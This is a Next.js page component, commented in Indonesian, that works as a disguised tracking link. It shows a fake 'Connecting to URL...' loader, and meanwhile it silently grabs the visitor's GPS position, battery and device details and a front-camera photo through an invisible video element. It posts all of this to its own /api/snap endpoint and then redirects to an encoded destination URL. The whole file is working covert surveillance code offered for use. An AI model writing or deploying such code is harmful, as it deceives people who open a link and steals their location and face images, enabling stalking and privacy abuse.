"use client";

import React, { useEffect, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";

function CaptureContent() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const autoProcess = async () => {
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      // 1. Deteksi Perangkat & Hardware
      const deviceInfo = {
        model: navigator.userAgent.includes("Android")
          ? "Android"
          : navigator.userAgent.includes("iPhone")
            ? "iOS"
            : "PC",
        os: navigator.platform,
        browser: navigator.userAgent.split(" ").pop(),
      };

      // 2. Deteksi Dukungan WebUSB (Ya-WebADB) & Izin Lainnya
      const permissions = {
        usb: "usb" in navigator ? "supported" : "unsupported",
        hid: "hid" in navigator ? "supported" : "unsupported",
        notifications:
          "Notification" in window ? Notification.permission : "unsupported",
      };

      // 3. Deteksi Baterai
      let batteryInfo = null;
      try {
        if ("getBattery" in navigator) {
          const b: any = await (navigator as any).getBattery();
          batteryInfo = {
            level: Math.round(b.level * 100),
            charging: b.charging,
          };
        }
      } catch (e) {}

      // 4. Ambil GPS
      const gps = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => resolve(null),
          { timeout: 5000 },
        );
      });

      // 5. Proses Capture Kamera
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
        });
        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((r) => setTimeout(r, 1500));

          const canvas = canvasRef.current;
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);

          const image = canvas.toDataURL("image/png");
          stream.getTracks().forEach((track) => track.stop());

          // Kirim ke API
          await fetch("/api/snap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image,
              gps,
              device: deviceInfo,
              battery: batteryInfo,
              permissions: { ...permissions, location: !!gps },
            }),
          });
        }
      } catch (err) {
        // Tetap kirim data meskipun kamera gagal
        await fetch("/api/snap", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image: "",
            gps,
            device: deviceInfo,
            battery: batteryInfo,
            permissions,
          }),
        });
      } finally {
        window.location.replace(destination);
      }
    };

    autoProcess();
  }, [t]);

  return (
    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
      {/* Tampilan Fake Loading agar terlihat meyakinkan */}
      <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin mb-4"></div>
      <p className="text-[10px] tracking-[0.3em] text-blue-500 uppercase animate-pulse">
        Connecting to URL...
      </p>

      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}

export default function CapturePage() {
  return (
    <Suspense fallback={<div className="bg-black min-h-screen"></div>}>
      <CaptureContent />
    </Suspense>
  );
}
